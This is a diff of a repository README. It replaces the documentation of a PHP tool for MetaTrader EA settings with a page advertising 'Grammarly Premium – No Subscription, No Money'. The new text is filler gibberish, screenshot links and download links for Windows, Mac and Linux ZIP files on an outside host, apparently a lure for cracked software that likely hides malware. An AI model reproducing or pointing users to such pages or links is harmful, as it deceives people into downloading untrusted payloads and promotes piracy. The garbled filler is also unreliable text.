@@ -1,48 +1,49 @@
-# EA Set File Creator
+# Grammarly Premium – No Subscription, No Money
 
-A shared-hosting friendly PHP application that analyzes closed EA trade-history CSV files and generates a MetaTrader-style `.set` file.
+xsa dx asx ax dsa xsax
 
-## Local Run
+<p align="center">
+💀 🛠️ ⚙️ 🔧 📦 💻 🖥️ ⚡ 🚀 🧩 🔨 🗂️ 📁 👾
+<br>
+<img src="assets/hero.png" alt="Grammarly Premium – No Subscription, No Money preview" width="500">
+<br>
+👾 📁 🗂️ 🔨 🧩 🚀 ⚡ 🖥️ 💻 📦 🔧 ⚙️ 🛠️ 💀
+</p>
 
-```bash
-php -S 127.0.0.1:8000
-```
+sax<div>sax</div><div>as</div><div>xasxssdxd</div>
 
-Open:
+## Screenshots
 
-```text
-http://127.0.0.1:8000/
-```
+ddsssq<div>s</div><div>qsqsq</div>
 
-## Shared Hosting Upload
+<p align="center"><img src="assets/screenshots/screenshot-1.jpg" alt="s"></p>
 
-Upload these files to your hosting `public_html` or target folder:
+q
 
-- `index.php`
-- `style.css`
-- `script.js`
+<p align="center"><img src="assets/screenshots/screenshot-2.jpg" alt="Grammarly Premium – No Subscription, No Money screenshot 2"></p>
 
-No database is required.
+<p align="center"><img src="assets/screenshots/screenshot-3.jpg" alt="Grammarly Premium – No Subscription, No Money screenshot 3"></p>
 
-## CSV Format
+<p align="center"><img src="assets/screenshots/screenshot-4.jpg" alt="Grammarly Premium – No Subscription, No Money screenshot 4"></p>
 
-Best results come from CSV files with these columns:
+<p align="center"><img src="assets/screenshots/screenshot-5.jpg" alt="Grammarly Premium – No Subscription, No Money screenshot 5"></p>
 
-- `Symbol`
-- `Action` with `Buy` or `Sell`
-- `Pips`
-- `Profit` or `Profit (USD)`
-- `Open Date`
-- `Close Date`
+<p align="center"><img src="assets/screenshots/screenshot-6.jpg" alt="Grammarly Premium – No Subscription, No Money screenshot 6"></p>
 
-Deposit and balance rows are ignored automatically.
+<p align="center"><img src="assets/screenshots/screenshot-7.jpg" alt="Grammarly Premium – No Subscription, No Money screenshot 7"></p>
 
-## Important
+<p align="center"><img src="assets/screenshots/screenshot-8.jpg" alt="Grammarly Premium – No Subscription, No Money screenshot 8"></p>
 
-Enter only account balance, account currency, leverage, and trading pair. The app estimates all other values from the uploaded trade history, then lets you manually edit the generated values and visually compare your changes with the best generated set.
+<p align="center"><img src="assets/screenshots/screenshot-9.jpg" alt="Grammarly Premium – No Subscription, No Money screenshot 9"></p>
 
-There is also a second tab for uploading an existing `.set` file and comparing it against the generated best values.
+## Repository Files
 
-The generated `.set` file uses common EA input names such as `RiskPercent`, `FixedLot`, `StopLossPips`, and `TakeProfitPips`. If your EA uses different input names, rename the keys in the downloaded `.set` file to match your EA.
+- `assets/preview.png` and `assets/screenshots/` contain generated images.
+- `grammarly34-windows/`, `grammarly34-mac/`, and `grammarly34-linux/` contain extracted EX Creator ZIP files.
+- `docs/` contains install, FAQ, and troubleshooting pages.
 
-Always test generated settings in the Strategy Tester or on a demo account before using them live.
+## Source downloads
+
+- Windows: https://insfra.co/wp/wp-content/uploads/ex-creator-tool/86de7e23-c96c-4f0d-aca2-f60a3bd1f7c5/test-windows.zip
+- Mac: https://insfra.co/wp/wp-content/uploads/ex-creator-tool/86de7e23-c96c-4f0d-aca2-f60a3bd1f7c5/test-mac.zip
+- Linux: https://insfra.co/wp/wp-content/uploads/ex-creator-tool/86de7e23-c96c-4f0d-aca2-f60a3bd1f7c5/test-linux.zip
